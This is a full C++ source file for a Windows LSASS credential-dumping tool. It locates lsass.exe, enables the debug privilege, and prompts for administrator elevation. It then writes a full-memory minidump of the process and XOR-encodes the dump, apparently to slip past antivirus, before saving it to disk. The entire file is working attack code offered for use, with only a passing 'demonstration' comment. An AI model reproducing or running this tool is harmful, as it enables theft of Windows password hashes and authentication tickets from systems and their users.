#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <vector>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <chrono>
#include <atomic>

#pragma comment(lib, "Dbghelp.lib")

typedef BOOL(WINAPI* MiniDumpWriteDump_t)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
);

BOOL CALLBACK MiniDumpCallback(
    PVOID CallbackParam,
    PMINIDUMP_CALLBACK_INPUT CallbackInput,
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
) {
    if (!CallbackInput || !CallbackOutput) {
        return TRUE;
    }

    switch (CallbackInput->CallbackType) {
        case ModuleCallback:
        {

            CallbackOutput->ModuleWriteFlags |= (ModuleWriteModule | ModuleWriteMiscRecord | ModuleWriteCvRecord);
            return TRUE;
        }

        case ThreadCallback:
        {

            CallbackOutput->ThreadWriteFlags = (ThreadWriteThread | ThreadWriteContext | ThreadWriteInstructionWindow);
            return TRUE;
        }

        case IncludeModuleCallback:
        {

            return TRUE;
        }

        case IncludeThreadCallback:
        {
            return TRUE;
        }

        case MemoryCallback:
        {
            return TRUE;
        }

        case CancelCallback:
        {
            return FALSE; 
        }

        case ReadMemoryFailureCallback:
        {
            return TRUE;
        }

        case IoStartCallback:
        case IoWriteAllCallback:
        case IoFinishCallback:
        {
            return TRUE;
        }

        default:
            return TRUE;
    }
}

DWORD FindLsassPid() {
    DWORD lsassPid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W processEntry = { 0 };
        processEntry.dwSize = sizeof(PROCESSENTRY32W);
        
        if (Process32FirstW(hSnapshot, &processEntry)) {
            do {
                if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0) {
                    lsassPid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &processEntry));
        }
        CloseHandle(hSnapshot);
    }
    
    return lsassPid;
}

bool EnableSeDebugPrivilege() {
    HANDLE hToken = NULL;
    bool result = false;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LUID luid;
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            TOKEN_PRIVILEGES tp;
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                result = (GetLastError() == ERROR_SUCCESS);
            }
        }
        CloseHandle(hToken);
    }
    return result;
}

#define MINIDUMP_TIMEOUT 30000 // 30 seconds timeout in milliseconds

bool DumpLsassToMemoryBuffer(std::vector<BYTE>& outputBuffer) {
    outputBuffer.clear();

    std::cout << "[+] Finding lsass.exe process ID..." << std::endl;
    DWORD lsassPid = FindLsassPid();
    if (lsassPid == 0) {
        std::cout << "[-] Failed to find lsass.exe process" << std::endl;
        return false;
    }
    std::cout << "[+] Found lsass.exe process ID: " << lsassPid << std::endl;

    HANDLE hLsass = NULL;
    DWORD accessCombinations[] = {
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        PROCESS_ALL_ACCESS
    };

    std::cout << "[+] Attempting to open lsass.exe process..." << std::endl;
    for (DWORD access : accessCombinations) {
        hLsass = OpenProcess(access, FALSE, lsassPid);
        if (hLsass) {
            std::cout << "[+] Successfully opened lsass.exe with access rights: 0x" 
                     << std::hex << access << std::dec << std::endl;
            break;
        }
        std::cout << "[-] Failed to open with access rights 0x" 
                 << std::hex << access << std::dec 
                 << ", error: " << GetLastError() << std::endl;
    }

    if (!hLsass) {
        std::cout << "[-] Could not open lsass.exe process" << std::endl;
        return false;
    }

    WCHAR tempPath[MAX_PATH] = {};
    WCHAR tempFileName[MAX_PATH] = {};

    if (!GetTempPathW(MAX_PATH, tempPath)) {
        CloseHandle(hLsass);
        return false;
    }

    if (!GetTempFileNameW(tempPath, L"LSA", 0, tempFileName)) {
        CloseHandle(hLsass);
        return false;
    }

    HANDLE hFile = CreateFileW(
        tempFileName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );

    
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hLsass);
        return false;
    }

    std::cout << "[+] Created temporary file for dumping" << std::endl;

    HMODULE hDbgHelp = LoadLibraryW(L"dbghelp.dll");
    if (!hDbgHelp) {
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    auto pMiniDumpWriteDump = (MiniDumpWriteDump_t)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!pMiniDumpWriteDump) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    MINIDUMP_CALLBACK_INFORMATION callbackInfo = {};
    callbackInfo.CallbackRoutine = MiniDumpCallback;

    MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
        MiniDumpWithFullMemory |
        MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules |
        MiniDumpWithThreadInfo |
        MiniDumpWithFullMemoryInfo |
        MiniDumpWithProcessThreadData |
        MiniDumpWithIndirectlyReferencedMemory
    );

    // Setup to perform MiniDumpWriteDump with timeout
    std::atomic<bool> dumpFinished(false);
    std::atomic<bool> dumpSucceeded(false);
    std::atomic<DWORD> dumpErrorCode(0);
    
    std::thread dumpThread([&]() {
        std::cout << "[+] Attempting to call MiniDumpWriteDump in background thread..." << std::endl;
        BOOL dumpResult = pMiniDumpWriteDump(
            hLsass,
            lsassPid,
            hFile,
            dumpType,
            NULL,
            NULL,
            NULL  // Removing callback to simplify the call
        );

        dumpErrorCode = GetLastError();
        dumpSucceeded = dumpResult != FALSE;
        dumpFinished = true;
    });

    // Wait with timeout
    auto startTime = std::chrono::steady_clock::now();
    while (!dumpFinished) {
        auto elapsed = std::chrono::steady_clock::now() - startTime;
        if (std::chrono::duration_cast<std::chrono::milliseconds>(elapsed).count() > MINIDUMP_TIMEOUT) {
            std::cout << "[-] MiniDumpWriteDump timed out after " << MINIDUMP_TIMEOUT/1000 << " seconds" << std::endl;
            if (dumpThread.joinable()) {
                // In a real scenario, we would need to terminate the thread, but this is complex
                // and potentially dangerous. For this example, we'll detach it.
                dumpThread.detach();
            }
            FreeLibrary(hDbgHelp);
            CloseHandle(hFile);
            CloseHandle(hLsass);
            return false;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    if (dumpThread.joinable()) {
        dumpThread.join();
    }

    if (!dumpSucceeded) {
        std::cout << "[-] MiniDumpWriteDump failed with error code: " << dumpErrorCode << std::endl;
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    std::cout << "[+] Successfully dumped lsass with MiniDumpWriteDump" << std::endl;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    outputBuffer.resize(fileSize);

    // Reset file pointer before reading
    if (SetFilePointer(hFile, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, outputBuffer.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    // Cleanup
    FreeLibrary(hDbgHelp);
    CloseHandle(hFile);
    CloseHandle(hLsass);

    return true;
}

int main() {
    std::cout << "[*] Starting LSASS dumping tool" << std::endl;
    
    // Ensure we have admin rights
    BOOL isAdmin = FALSE;
    HANDLE token = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }

    // Auto-elevate if not admin
    if (!isAdmin) {
        std::cout << "[*] Process is not running as administrator, attempting to elevate..." << std::endl;
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(NULL, path, MAX_PATH);
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";
        sei.lpFile = path;
        sei.nShow = SW_NORMAL;
        if (ShellExecuteExA(&sei)) {
            std::cout << "[+] Elevation request sent" << std::endl;
        } else {
            std::cout << "[-] Failed to elevate: " << GetLastError() << std::endl;
        }
        return 0;
    }

    std::cout << "[+] Process is running with administrator privileges" << std::endl;

    // Enable debug privilege and dump LSASS
    if (EnableSeDebugPrivilege()) {
        std::cout << "[+] Successfully enabled SeDebugPrivilege" << std::endl;
    } else {
        std::cout << "[-] Failed to enable SeDebugPrivilege, continuing anyway..." << std::endl;
    }
    
    std::vector<BYTE> outputBuffer;
    std::cout << "[*] Attempting to dump LSASS process..." << std::endl;
        
    if (!DumpLsassToMemoryBuffer(outputBuffer)) {
        std::cout << "[-] Failed to dump LSASS process" << std::endl;
        return 1;
    }
    
    if (outputBuffer.empty() || outputBuffer.size() < 100 * 1024) {
        std::cout << "[-] Dump appears to be empty or too small (" << outputBuffer.size() << " bytes)" << std::endl;
        return 1;
    }

    std::cout << "[+] Successfully captured LSASS dump in memory (" << outputBuffer.size() << " bytes)" << std::endl;


    const BYTE XOR_KEY = 0xAA;
    std::cout << "[*] Encrypting dump with XOR key 0xAA..." << std::endl;
    for (size_t i = 0; i < outputBuffer.size(); ++i) {
        outputBuffer[i] ^= XOR_KEY;
    }

    std::cout << "[+] Writing encrypted dump to lsass_encrypted.dmp" << std::endl;

    // Write encrypted dump
    HANDLE encryptedFile = CreateFileA("lsass_encrypted.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (encryptedFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        if (WriteFile(encryptedFile, outputBuffer.data(), (DWORD)outputBuffer.size(), &bytesWritten, NULL)) {
            std::cout << "[+] Successfully wrote " << bytesWritten << " bytes to encrypted dump file" << std::endl;
        } else {
            std::cout << "[-] Failed to write to encrypted dump file: " << GetLastError() << std::endl;
        }
        CloseHandle(encryptedFile);
    } else {
        std::cout << "[-] Failed to create encrypted dump file: " << GetLastError() << std::endl;
    }

    // Decrypt and write decrypted dump
    std::cout << "[*] Decrypting the buffer to lsass_decrypted.dmp for demonstration purposes..." << std::endl;
    for (size_t i = 0; i < outputBuffer.size(); ++i) {
        outputBuffer[i] ^= XOR_KEY;
    }

    HANDLE decryptedFile = CreateFileA("lsass_decrypted.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (decryptedFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        if (WriteFile(decryptedFile, outputBuffer.data(), (DWORD)outputBuffer.size(), &bytesWritten, NULL)) {
            std::cout << "[+] Successfully wrote " << bytesWritten << " bytes to decrypted dump file" << std::endl;
        } else {
            std::cout << "[-] Failed to write to decrypted dump file: " << GetLastError() << std::endl;
        }
        CloseHandle(decryptedFile);
    } else {
        std::cout << "[-] Failed to create decrypted dump file: " << GetLastError() << std::endl;
    }

    // Free memory
    std::cout << "[+] Cleanup: Clearing memory buffers" << std::endl;
    outputBuffer.clear();
    std::vector<BYTE>().swap(outputBuffer);

    std::cout << "[+] Operation completed successfully" << std::endl;
    return 0;
}